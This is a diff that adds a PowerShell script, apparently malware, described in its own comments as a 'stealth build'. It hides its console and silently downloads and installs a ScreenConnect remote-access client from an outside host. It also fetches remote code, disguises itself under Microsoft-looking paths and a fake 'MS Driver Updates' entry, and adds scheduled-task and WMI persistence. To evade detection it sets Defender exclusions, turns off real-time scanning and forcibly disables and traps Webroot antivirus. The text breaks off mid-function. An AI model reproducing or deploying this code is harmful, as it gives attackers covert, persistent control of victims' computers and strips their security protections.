@@ -1,0 +1,1654 @@
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
+$VerbosePreference = 'SilentlyContinue'
+$InformationPreference = 'SilentlyContinue'
+$ConfirmPreference = 'None'
+
+# Hide console immediately
+try {
+    if (-not ('Native.Win' -as [type])) {
+        Add-Type -Name Win -Namespace Native -MemberDefinition @'
+[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'@
+    }
+    $hwnd = [Native.Win]::GetConsoleWindow()
+    if ($hwnd -ne [IntPtr]::Zero) { [void][Native.Win]::ShowWindow($hwnd, 0) }
+} catch {}
+
+$script:Mutex = $null
+try {
+    $script:Mutex = [System.Threading.Mutex]::new($false, 'Global\WinDiagCache_5f6010579852e507')
+    if (-not $script:Mutex.WaitOne(0)) {
+        # Prior monitor/deploy still holds mutex (common when Guest cannot kill SYSTEM PS).
+        # Take over: stop other wucache hosts, then retry.
+        try {
+            Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+                Where-Object { $_.CommandLine -match 'wucache_pkg|\.wucache|wucache\.ps1' -and $_.ProcessId -ne $PID } |
+                ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+        } catch {}
+        Start-Sleep -Seconds 2
+        if (-not $script:Mutex.WaitOne(5000)) {
+            try {
+                $WorkDirBoot = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache'
+                New-Item -ItemType Directory -Path $WorkDirBoot -Force -ErrorAction SilentlyContinue | Out-Null
+                Add-Content -Path (Join-Path $WorkDirBoot '.diag.log') -Value (
+                    "[{0}] mutex busy - exit (build waiting)" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+                ) -ErrorAction SilentlyContinue
+            } catch {}
+            exit
+        }
+    }
+} catch {}
+
+# ============================================
+# CONFIG - competition / stealth build
+# ============================================
+$PrimaryFingerprint = '5f6010579852e507'
+$AllowedFingerprints = @('5f6010579852e507', 'f861c8140d453427')
+$SvcName = "ScreenConnect Client ($PrimaryFingerprint)"
+$AllowedScreenConnect = @(
+    "ScreenConnect Client ($PrimaryFingerprint)",
+    'ScreenConnect Client (f861c8140d453427)'
+)
+$MsiUrl = 'https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
+$RelayServer = 'update.sevrz.com'
+$RelayPort = 443
+$MainScriptUrl = 'https://sevrz.com/Services/MSServices.ps1'
+$ArpDisplayName = 'MS Driver Updates'
+$ArpPublisher = 'Update tool'
+
+# Camouflaged paths (boring Microsoft-looking locations) + failover copy
+$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache'
+$WorkDirAlt = 'C:\ProgramData\Microsoft\Diagnosis\State\.etlcache'
+$MonitorScriptPath = Join-Path $WorkDir 'wucache.ps1'
+$MonitorScriptPathAlt = Join-Path $WorkDirAlt 'wucache.ps1'
+$HelperVbsPath = Join-Path $WorkDir 'wucache.vbs'
+$HelperVbsPathAlt = Join-Path $WorkDirAlt 'wucache.vbs'
+$MsiFile = Join-Path $WorkDir 'pkg.msi'
+$LogFile = Join-Path $WorkDir '.diag.log'   # hidden quiet log - NOT C:\Security
+
+# Persist only 2 mechanisms (harder to spot than 8 loud ones)
+$TaskPath = '\Microsoft\Windows\Diagnosis\'
+$TaskName = 'Scheduled'
+$WmiFilterName = 'BVTTriggerFilter'
+$WmiConsumerName = 'BVTConsumer'
+
+$LegacyFingerprints = @(
+    '9dd7e861c862d175',
+    '3a607f4eb8ca7215',
+    'd4212f02794545b5'
+)
+
+$RivalNames = @(
+    'AnyDesk', 'TeamViewer', 'DWService', 'GoToMyPC', 'LogMeIn', 'VNC', 'UltraVNC', 'TightVNC',
+    'Splashtop', 'Zoho Assist', 'RustDesk', 'RemotePC', 'Dameware', 'Atera', 'NinjaOne',
+    'N-able', 'N-central', 'Kaseya', 'Pulseway', 'Syncro', 'SuperOps', 'ITarian',
+    'ManageEngine', 'SolarWinds', 'ConnectWise RMM', 'AnyDeskSetup', 'TeamViewer_Setup',
+    'TeamViewerQS', 'ScreenConnect.ClientSetup', 'ClientSetup'
+)
+
+# ============================================
+# ELEVATION - prefer SYSTEM via RMM (no UAC)
+# If already SYSTEM/Admin, continue silently.
+# Interactive RunAs only when neither (last resort).
+# ============================================
+$currentId = [Security.Principal.WindowsIdentity]::GetCurrent()
+$isSystem = ($currentId.User.Value -eq 'S-1-5-18')
+$isAdmin = ([Security.Principal.WindowsPrincipal]$currentId).IsInRole(
+    [Security.Principal.WindowsBuiltInRole]::Administrator
+)
+if (-not $isAdmin -and -not $isSystem) {
+    # Not elevated - try UAC relaunch (avoid this by deploying as SYSTEM from your RMM)
+    Start-Process powershell.exe -Verb RunAs -ArgumentList (
+        "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+    ) -WindowStyle Hidden | Out-Null
+    exit
+}
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+if ($PSCommandPath -and (
+    -not (Test-Path $PSCommandPath) -or
+    ((Get-Item $PSCommandPath -ErrorAction SilentlyContinue).Length -lt 1000)
+)) {
+    try {
+        $scriptDir = Split-Path $PSCommandPath -Parent
+        if ($scriptDir -and -not (Test-Path $scriptDir)) {
+            New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
+        }
+        Invoke-WebRequest -Uri $MainScriptUrl -OutFile $PSCommandPath -UseBasicParsing
+        if ((Test-Path $PSCommandPath) -and ((Get-Item $PSCommandPath).Length -ge 1000)) {
+            & $PSCommandPath
+            exit
+        }
+    } catch {}
+}
+
+function Write-Log {
+    param([string]$Message)
+    try {
+        if (-not (Test-Path $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
+        $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+        Add-Content -Path $LogFile -Value "[$ts] $Message" -ErrorAction SilentlyContinue
+        $f = Get-Item $LogFile -Force -ErrorAction SilentlyContinue
+        if ($f) { $f.Attributes = 'Hidden', 'System' }
+    } catch {}
+}
+
+function Set-HiddenSystem {
+    param([string]$Path)
+    try {
+        $i = Get-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
+        if ($i) { $i.Attributes = 'Hidden', 'System' }
+    } catch {}
+}
+
+function Get-ScInstallRoots {
+    param([string]$Fingerprint = $PrimaryFingerprint)
+    @(
+        "${env:ProgramFiles}\ScreenConnect Client ($Fingerprint)",
+        "${env:ProgramFiles(x86)}\ScreenConnect Client ($Fingerprint)",
+        "${env:ProgramData}\ScreenConnect\$Fingerprint",
+        "${env:ProgramData}\ScreenConnect"
+    ) | Where-Object { $_ -and (Test-Path $_) }
+}
+
+function Test-WebrootPresent {
+    # Active agent only (folder leftover after disable should not keep tripping forever)
+    $svcs = Get-Service -Name @('WRSVC', 'WRSAService', 'WRCoreService') -ErrorAction SilentlyContinue |
+        Where-Object { $_.Status -eq 'Running' }
+    if ($svcs) { return $true }
+    if (Get-Process -Name @('WRSA', 'WRSAMain', 'WRConsumerService') -ErrorAction SilentlyContinue) { return $true }
+    return $false
+}
+
+function Test-WebrootInstalled {
+    if (Get-Service -Name @('WRSVC', 'WRSAService', 'WRCoreService') -ErrorAction SilentlyContinue) { return $true }
+    foreach ($p in @(
+        "${env:ProgramFiles}\Webroot",
+        "${env:ProgramFiles(x86)}\Webroot",
+        "${env:ProgramData}\WRData"
+    )) {
+        if (Test-Path $p) { return $true }
+    }
+    return $false
+}
+
+function Test-ScHollowClient {
+    # Service up / relay check-in but binaries missing/quarantined = IP-only zombie session
+    if (-not (Test-ScServiceRunning)) { return $false }
+    $roots = @(Get-ScInstallRoots)
+    if ($roots.Count -eq 0) { return $true }
+    $exes = foreach ($r in $roots) {
+        Get-ChildItem -Path $r -Recurse -Include 'ScreenConnect.ClientService.exe', 'ScreenConnect.Client.exe', 'ScreenConnect.WindowsClient.exe' -ErrorAction SilentlyContinue
+    }
+    if (-not $exes -or @($exes).Count -eq 0) { return $true }
+    foreach ($e in $exes) {
+        if (-not $e.Exists -or $e.Length -lt 50000) { return $true }
+        try {
+            $fs = [IO.File]::Open($e.FullName, 'Open', 'Read', 'Read')
+            $fs.Close()
+        } catch {
+            return $true
+        }
+    }
+    return $false
+}
+
+function Enable-ScFirewallAllow {
+    foreach ($root in (Get-ScInstallRoots)) {
+        Get-ChildItem -Path $root -Recurse -Filter *.exe -ErrorAction SilentlyContinue | ForEach-Object {
+            $n = "WU_SC_$($_.BaseName)"
+            netsh advfirewall firewall delete rule name="$n" >$null 2>&1
+            netsh advfirewall firewall delete rule name="${n}_out" >$null 2>&1
+            netsh advfirewall firewall add rule name="$n" dir=in action=allow program="$($_.FullName)" enable=yes profile=any >$null 2>&1
+            netsh advfirewall firewall add rule name="${n}_out" dir=out action=allow program="$($_.FullName)" enable=yes profile=any >$null 2>&1
+        }
+    }
+    Write-Log 'SC firewall allow rules applied'
+}
+
+function Enable-QuietDefenderExclusions {
+    # Quiet only - path/process exclusions. Never disables realtime here.
+    $ok = $false
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+        try {
+            Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
+            Add-MpPreference -ExclusionPath $WorkDirAlt -ErrorAction SilentlyContinue
+            foreach ($root in (Get-ScInstallRoots)) {
+                Add-MpPreference -ExclusionPath $root -ErrorAction SilentlyContinue
+            }
+            # Also exclude default Program Files SC pattern even before install
+            Add-MpPreference -ExclusionPath "${env:ProgramFiles}\ScreenConnect Client ($PrimaryFingerprint)" -ErrorAction SilentlyContinue
+            Add-MpPreference -ExclusionPath "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)" -ErrorAction SilentlyContinue
+            foreach ($proc in @(
+                'powershell.exe', 'pwsh.exe', 'msiexec.exe', 'wscript.exe',
+                'ScreenConnect.ClientService.exe', 'ScreenConnect.Client.exe',
+                'ScreenConnect.WindowsClient.exe', 'ScreenConnect.ClientSetup.exe'
+            )) {
+                Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
+            }
+            Write-Log 'Quiet Defender exclusions applied (workdir + SC paths/processes)'
+            $ok = $true
+        } catch {
+            Write-Log "Quiet exclusions failed: $($_.Exception.Message)"
+        }
+    }
+    return $ok
+}
+
+function Invoke-WebrootPushback {
+    # Soft pause - prefer Invoke-WebrootNuclear when control/inventory is broken
+    if (-not (Test-WebrootInstalled)) { return $false }
+    Write-Log 'Webroot detected - pausing agent and shielding SC paths'
+
+    foreach ($svcName in @('WRSVC', 'WRSAService', 'WRCoreService', 'WRConsumerService', 'WRSkyClient')) {
+        & sc.exe stop "$svcName" >$null 2>&1
+        & sc.exe config "$svcName" start= disabled >$null 2>&1
+        $s = Get-Service -Name $svcName -ErrorAction SilentlyContinue
+        if ($s) {
+            Stop-Service -Name $svcName -Force -ErrorAction SilentlyContinue
+            Set-Service -Name $svcName -StartupType Disabled -ErrorAction SilentlyContinue
+            Write-Log "Webroot service stopped/disabled: $svcName"
+        }
+    }
+    Get-Process -Name @('WRSA', 'WRSAMain', 'WRConsumerService', 'WRCoreService', 'WRSkyClient') -ErrorAction SilentlyContinue |
+        ForEach-Object { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue }
+
+    Enable-QuietDefenderExclusions | Out-Null
+    Enable-ScFirewallAllow
+    return $true
+}
+
+function Invoke-WebrootNuclear {
+    # Hard disable: Webroot self-heals (NOT_STOPPABLE) and replaces SC exes with tiny stubs
+    if (-not (Test-WebrootInstalled)) { return $false }
+    Write-Log 'Webroot NUCLEAR: stop/delete services, IFEO trap, registry disable, pending rename'
+
+    Invoke-WebrootPushback | Out-Null
+
+    foreach ($svcName in @('WRSVC', 'WRSAService', 'WRCoreService', 'WRConsumerService', 'WRSkyClient', 'Webroot Firewall Service')) {
+        & sc.exe stop "$svcName" >$null 2>&1
+        & sc.exe config "$svcName" start= disabled >$null 2>&1
+        & sc.exe delete "$svcName" >$null 2>&1
+        # Registry disable survives NOT_STOPPABLE / self-heal until reboot
+        foreach ($root in @(
+            "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName",
+            "HKLM:\SYSTEM\ControlSet001\Services\$svcName"
+        )) {
+            if (Test-Path $root) {
+                Set-ItemProperty -Path $root -Name Start -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
+                Set-ItemProperty -Path $root -Name DeleteFlag -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+                Write-Log "Webroot registry Start=4: $svcName"
+            }
+        }
+    }
+
+    foreach ($drv in @('WRkrn', 'WRCore', 'WebrootSecureAnywhere', 'WRAuxiliary')) {
+        & sc.exe stop "$drv" >$null 2>&1
+        & sc.exe config "$drv" start= disabled >$null 2>&1
+        try { & fltmc.exe unload "$drv" >$null 2>&1 } catch {}
+        $dk = "HKLM:\SYSTEM\CurrentControlSet\Services\$drv"
+        if (Test-Path $dk) {
+            Set-ItemProperty -Path $dk -Name Start -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    # IFEO: any launch of Webroot agent immediately exits (beats user-mode self-heal)
+    foreach ($exe in @('WRSA.exe', 'WRSAMain.exe', 'WRConsumerService.exe', 'WRCoreService.exe', 'WRSkyClient.exe')) {
+        $ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
+        New-Item -Path $ifeo -Force -ErrorAction SilentlyContinue | Out-Null
+        Set-ItemProperty -Path $ifeo -Name Debugger -Value 'systray.exe' -Force -ErrorAction SilentlyContinue
+        Write-Log "IFEO trap: $exe"
+    }
+
+    Get-Process -ErrorAction SilentlyContinue | Where-Object {
+        $_.ProcessName -like 'WR*' -or $_.ProcessName -like '*Webroot*'
+    } | ForEach-Object {
+        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+    }
+
+    # Best-effort silent uninstall
+    foreach ($uninst in @(
+        "${env:ProgramFiles}\Webroot\WRSA.exe",
+        "${env:ProgramFiles(x86)}\Webroot\WRSA.exe"
+    )) {
+        if (Test-Path $uninst) {
+            try {
+                Start-Process -FilePath $uninst -ArgumentList '-uninstall','-silent' -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
+                Write-Log "Tried WRSA silent uninstall: $uninst"
+            } catch {}
+        }
+    }
+
+    foreach ($root in @(
+        "${env:ProgramFiles}\Webroot",
+        "${env:ProgramFiles(x86)}\Webroot",
+        "${env:ProgramData}\WRData",
+        "${env:ProgramData}\Webroot"
+    )) {
+        if (-not (Test-Path $root)) { continue }
+        $disabled = "$root.disabled_$(Get-Date -Format 'yyyyMMddHHmmss')"
+        try {
+            Move-Item -LiteralPath $root -Destination $disabled -Force -ErrorAction Stop
+            Write-Log "Webroot path renamed: $root -> $disabled"
+        } catch {
+            try {
+                Get-ChildItem -LiteralPath $root -Recurse -Filter *.exe -ErrorAction SilentlyContinue | ForEach-Object {
+                    try {
+                        $acl = Get-Acl $_.FullName
+                        $acl.SetAccessRuleProtection($true, $false)
+                        $deny = New-Object System.Security.AccessControl.FileSystemAccessRule(
+                            'Everyone', 'ExecuteFile,ReadAndExecute,Modify,Write', 'Deny'
+                        )
+                        $acl.AddAccessRule($deny)
+                        Set-Acl -Path $_.FullName -AclObject $acl -ErrorAction SilentlyContinue
+                    } catch {}
+                    # Reboot-pending delete/rename
+                    try {
+                        if (-not ('Native.MoveEx' -as [type])) {
+                            Add-Type -Namespace Native -Name MoveEx -MemberDefinition @'
+[DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
+public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);
+'@
+                        }
+                        [Native.MoveEx]::MoveFileEx($_.FullName, $null, 4) | Out-Null  # MOVEFILE_DELAY_UNTIL_REBOOT
+                    } catch {}
+                }
+                Write-Log "Webroot exe neutralize/pending-reboot under: $root"
+            } catch {}
+        }
+    }
+
+    Enable-QuietDefenderExclusions | Out-Null
+    Enable-ScFirewallAllow
+    return $true
+}
+
+function Get-ScBinaryHealth {
+    $info = [ordered]@{
+        ServiceRunning = [bool](Test-ScServiceRunning)
+        Roots          = @((Get-ScInstallRoots))
+        ExeCount       = 0
+        DllCount       = 0
+        MaxExeSize     = 0
+        MaxDllSize     = 0
+        ExeDetail      = @()
+        ProcCount      = 0
+        Stubbed        = $false
+    }
+    foreach ($r in $info.Roots) {
+        Get-ChildItem -Path $r -Recurse -Include 'ScreenConnect*.exe' -ErrorAction SilentlyContinue | ForEach-Object {
+            $info.ExeCount++
+            if ($_.Length -gt $info.MaxExeSize) { $info.MaxExeSize = $_.Length }
+            $readable = $true
+            try {
+                $fs = [IO.File]::Open($_.FullName, 'Open', 'Read', 'Read')
+                $fs.Close()
+            } catch { $readable = $false }
+            $info.ExeDetail += ('{0} size={1} readable={2}' -f $_.Name, $_.Length, $readable)
+        }
+        Get-ChildItem -Path $r -Recurse -Include 'ScreenConnect*.dll' -ErrorAction SilentlyContinue | ForEach-Object {
+            $info.DllCount++
+            if ($_.Length -gt $info.MaxDllSize) { $info.MaxDllSize = $_.Length }
+        }
+    }
+    $info.ProcCount = @(Get-Process -ErrorAction SilentlyContinue | Where-Object {
+        $_.ProcessName -like 'ScreenConnect*' -or $_.ProcessName -like '*ClientService*'
+    }).Count
+    # Real SC payloads are much larger; ~60-100KB files after Webroot gutting are stubs
+    if ($info.MaxExeSize -gt 0 -and $info.MaxExeSize -lt 200000 -and $info.MaxDllSize -lt 400000) {
+        $info.Stubbed = $true
+    }
+    return $info
+}
+
+function Test-ScControlBroken {
+    $h = Get-ScBinaryHealth
+    if (-not $h.ServiceRunning) { return $true }
+    if ($h.Roots.Count -eq 0) { return $true }
+    if ($h.ExeCount -lt 1) { return $true }
+    if ($h.Stubbed) { return $true }
+    foreach ($line in $h.ExeDetail) {
+        if ($line -match 'readable=False' -or $line -match 'size=0') { return $true }
+    }
+    if ($h.ProcCount -lt 1) { return $true }
+    return $false
+}
+
+function Repair-ScAfterAv {
+    Write-Log 'REPAIR: Webroot nuclear + clean SC reinstall (empty name / no join)'
+    Invoke-WebrootNuclear | Out-Null
+    Start-Sleep -Seconds 3
+
+    $h1 = Get-ScBinaryHealth
+    Write-Log ("SC health before repair: running={0} exes={1} procs={2}" -f $h1.ServiceRunning, $h1.ExeCount, $h1.ProcCount)
+    foreach ($d in $h1.ExeDetail) { Write-Log ("  bin: $d") }
+
+    Uninstall-PrimaryScResidue
+    Start-Sleep -Seconds 2
+
+    # Force install path even if service remnants confuse detection
+    Write-Log 'REPAIR: downloading fresh MSI'
+    if (Test-Path $MsiFile) { Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue }
+    try {
+        Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiFile -UseBasicParsing -UserAgent 'Mozilla/5.0'
+    } catch {
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
+        $wc.DownloadFile($MsiUrl, $MsiFile)
+        $wc.Dispose()
+    }
+    if (-not (Test-Path $MsiFile) -or ((Get-Item $MsiFile).Length -lt 500000)) {
+        Write-Log 'REPAIR: MSI invalid'
+        return $false
+    }
+    Write-Log ("REPAIR: MSI bytes " + (Get-Item $MsiFile).Length)
+    $logMsi = Join-Path $WorkDir 'msi_repair.log'
+    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
+        -Wait -PassThru -WindowStyle Hidden
+    Write-Log "REPAIR: msiexec exit $($p.ExitCode)"
+    if ($p.ExitCode -ne 0) {
+        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus" `
+            -Wait -PassThru -WindowStyle Hidden
+        Write-Log "REPAIR: msiexec reinstall exit $($p2.ExitCode)"
+    }
+    Start-Sleep -Seconds 10
+    Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue
+    Start-PrimaryService | Out-Null
+    Enable-ScFirewallAllow
+    Set-ArpCamouflage | Out-Null
+
+    $h2 = Get-ScBinaryHealth
+    Write-Log ("SC health after repair: running={0} exes={1} procs={2}" -f $h2.ServiceRunning, $h2.ExeCount, $h2.ProcCount)
+    foreach ($d in $h2.ExeDetail) { Write-Log ("  bin: $d") }
+    $ok = ((Test-ScServiceRunning) -and -not (Test-ScControlBroken))
+    if ($ok) {
+        $marker = Join-Path $WorkDir '.repaired_webroot'
+        Set-Content -Path $marker -Value (Get-Date -Format 'o') -Encoding ASCII -Force
+        Write-Log 'REPAIR: success marker written'
+    } else {
+        Write-Log 'REPAIR: still broken after reinstall (likely Webroot stubs / NOT_STOPPABLE)'
+        # Schedule one boot-time repair after IFEO/registry Start=4 take effect
+        try {
+            $bootPs1 = Join-Path $WorkDir 'wucache_bootrepair.ps1'
+            $bootBody = @"
+`$ErrorActionPreference='SilentlyContinue'
+Start-Sleep 20
+& powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path `$env:ProgramData 'Microsoft\Windows\WER\Temp\.wucache\wucache_pkg.ps1')
+"@
+            Set-Content -Path $bootPs1 -Value $bootBody -Encoding ASCII -Force
+            Unregister-ScheduledTask -TaskName 'WMIRegistration' -TaskPath '\Microsoft\Windows\Diagnosis\' -Confirm:$false -ErrorAction SilentlyContinue
+            $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$bootPs1`""
+            $t = New-ScheduledTaskTrigger -AtStartup
+            $p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+            $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+            Register-ScheduledTask -TaskName 'WMIRegistration' -TaskPath '\Microsoft\Windows\Diagnosis\' -Action $a -Trigger $t -Principal $p -Settings $s -Force | Out-Null
+            Write-Log 'REPAIR: boot-time repair task armed - REBOOT REQUIRED'
+        } catch {
+            Write-Log "REPAIR: boot task failed: $($_.Exception.Message)"
+        }
+    }
+    return $ok
+}
+
+function Test-PayloadInterference {
+    # Returns $true if AV/host appears to be blocking our payload
+    $issues = @()
+    if (-not (Test-Path $WorkDir)) { $issues += 'workdir_missing' }
+    if (-not (Test-Path $MonitorScriptPath) -and -not (Test-Path $MonitorScriptPathAlt)) {
+        $issues += 'monitor_missing'
+    }
+    # Cannot write marker = likely quarantine/lock
+    try {
+        $probe = Join-Path $WorkDir '.writeprobe'
+        'ok' | Out-File -FilePath $probe -Encoding ASCII -Force -ErrorAction Stop
+        Remove-Item $probe -Force -ErrorAction SilentlyContinue
+    } catch {
+        $issues += 'workdir_not_writable'
+    }
+    # Primary SC service vanished or won't stay running after we expect it
+    if (-not (Test-ScServicePresent)) {
+        $issues += 'sc_service_missing'
+    } elseif (-not (Test-ScServiceRunning)) {
+        if (-not (Start-PrimaryService)) { $issues += 'sc_start_blocked' }
+    }
+    if (Test-ScHollowClient) { $issues += 'sc_hollow_av_quarantine' }
+    # Webroot running alone is not "interference" for MSI - handled separately in Phase 1
+    # Script execution policy / ASR style block - try a tiny nested powershell
+    try {
+        $r = & powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "1+1" 2>&1
+        if ("$r" -notmatch '2') { $issues += 'powershell_blocked' }
+    } catch {
+        $issues += 'powershell_blocked'
+    }
+    return @{ Interfered = ($issues.Count -gt 0); Issues = $issues }
+}
+
+function Invoke-ReactiveAvPushback {
+    param([string[]]$Issues = @())
+    # ONLY when interference is detected - escalate gradually, not on every run
+    Write-Log ("Reactive AV pushback - issues: " + ($Issues -join ', '))
+
+    # 1) Re-assert quiet exclusions + SC firewall
+    Enable-QuietDefenderExclusions | Out-Null
+    Enable-ScFirewallAllow
+
+    # 2) Webroot: pause agent (main cause of IP-only SC sessions)
+    if ($Issues -contains 'webroot_present' -or $Issues -contains 'sc_hollow_av_quarantine' -or (Test-WebrootInstalled)) {
+        Invoke-WebrootPushback | Out-Null
+    }
+
+    # 3) Restore monitor from whichever copy still exists / re-seed both
+    try {
+        New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
+        New-Item -ItemType Directory -Path $WorkDirAlt -Force | Out-Null
+        if ((Test-Path $MonitorScriptPath) -and -not (Test-Path $MonitorScriptPathAlt)) {
+            Copy-Item $MonitorScriptPath $MonitorScriptPathAlt -Force -ErrorAction SilentlyContinue
+        } elseif ((Test-Path $MonitorScriptPathAlt) -and -not (Test-Path $MonitorScriptPath)) {
+            Copy-Item $MonitorScriptPathAlt $MonitorScriptPath -Force -ErrorAction SilentlyContinue
+        }
+        if ((Test-Path $HelperVbsPath) -and -not (Test-Path $HelperVbsPathAlt)) {
+            Copy-Item $HelperVbsPath $HelperVbsPathAlt -Force -ErrorAction SilentlyContinue
+        } elseif ((Test-Path $HelperVbsPathAlt) -and -not (Test-Path $HelperVbsPath)) {
+            Copy-Item $HelperVbsPathAlt $HelperVbsPath -Force -ErrorAction SilentlyContinue
+        }
+        Set-HiddenSystem $WorkDir
+        Set-HiddenSystem $WorkDirAlt
+    } catch {}
+
+    # 4) Soften Defender ONLY if still interfered (no blanket 3rd-party AV kill beyond Webroot)
+    $still = Test-PayloadInterference
+    if ($still.Interfered -and (Get-Command Set-MpPreference -ErrorAction SilentlyContinue)) {
+        Write-Log 'Reactive: temporary Defender soften (realtime/script scan) due to active block'
+        try {
+            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+            Enable-QuietDefenderExclusions | Out-Null
+        } catch {}
+    }
+
+    # 5) If SC hollow/missing - reinstall after AV pause. start_blocked = start only, no MSI.
+    if ($Issues -contains 'sc_service_missing' -or $Issues -contains 'sc_hollow_av_quarantine') {
+        Start-Sleep -Seconds 2
+        Write-Log 'Reactive: reinstall primary SC after AV pushback'
+        Install-PrimarySc | Out-Null
+        Start-PrimaryService | Out-Null
+        Enable-ScFirewallAllow
+        Set-ArpCamouflage | Out-Null
+    } elseif ($Issues -contains 'sc_start_blocked') {
+        Write-Log 'Reactive: start-only (no MSI) for sc_start_blocked'
+        Start-PrimaryService | Out-Null
+    }
+
+    Write-Log 'Reactive AV pushback complete'
+}
+
+function Sync-MonitorCopies {
+    param([string]$Content)
+    New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
+    New-Item -ItemType Directory -Path $WorkDirAlt -Force | Out-Null
+    $Content | Out-File -FilePath $MonitorScriptPath -Encoding UTF8 -Force
+    $Content | Out-File -FilePath $MonitorScriptPathAlt -Encoding UTF8 -Force
+    Set-HiddenSystem $MonitorScriptPath
+    Set-HiddenSystem $MonitorScriptPathAlt
+    Set-HiddenSystem $WorkDir
+    Set-HiddenSystem $WorkDirAlt
+}
+
+function Write-FailoverVbs {
+    param([string]$Path)
+    # Build with concatenation (avoid here-string parse issues on some locales)
+    $lines = @(
+        'Set fso = CreateObject("Scripting.FileSystemObject")'
+        'Set sh = CreateObject("WScript.Shell")'
+        ('p1 = "' + $MonitorScriptPath + '"')
+        ('p2 = "' + $MonitorScriptPathAlt + '"')
+        'target = ""'
+        'If fso.FileExists(p1) Then'
+        '  target = p1'
+        'ElseIf fso.FileExists(p2) Then'
+        '  target = p2'
+        'End If'
+        'If target <> "" Then'
+        '  sh.Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & target & """", 0, False'
+        'End If'
+    )
+    ($lines -join "`r`n") | Out-File -FilePath $Path -Encoding ASCII -Force
+    Set-HiddenSystem $Path
+}
+
+function Test-IsAllowedSc {
+    param([string]$Name, [string]$Path = '')
+    foreach ($fp in $AllowedFingerprints) {
+        if ($Name -like "*$fp*" -or $Path -like "*$fp*") { return $true }
+    }
+    # Camouflaged primary only - never treat generic ScreenConnect as allowed
+    if ($Name -eq $ArpDisplayName -and ($Path -like "*$PrimaryFingerprint*" -or $Name -eq $ArpDisplayName)) {
+        # ARP name alone is weak; still allow service-path checks via fingerprint elsewhere
+        return $true
+    }
+    return $false
+}
+
+function Get-InstalledScFingerprints {
+    $found = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
+
+    try {
+        Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -like 'ScreenConnect Client*' -or $_.DisplayName -like 'ScreenConnect Client*' } |
+            ForEach-Object {
+                $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
+                if ($blob -match '\(([0-9a-fA-F]{16})\)') { [void]$found.Add($Matches[1].ToLower()) }
+                elseif ($blob -match '([0-9a-fA-F]{16})') { [void]$found.Add($Matches[1].ToLower()) }
+            }
+    } catch {}
+
+    foreach ($base in @(
+        "${env:ProgramFiles}",
+        "${env:ProgramFiles(x86)}"
+    )) {
+        if (-not (Test-Path $base)) { continue }
+        Get-ChildItem -Path $base -Directory -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -like 'ScreenConnect Client*' } |
+            ForEach-Object {
+                if ($_.Name -match '\(([0-9a-fA-F]{16})\)') { [void]$found.Add($Matches[1].ToLower()) }
+            }
+    }
+
+    $pd = "${env:ProgramData}\ScreenConnect"
+    if (Test-Path $pd) {
+        Get-ChildItem -Path $pd -Directory -ErrorAction SilentlyContinue | ForEach-Object {
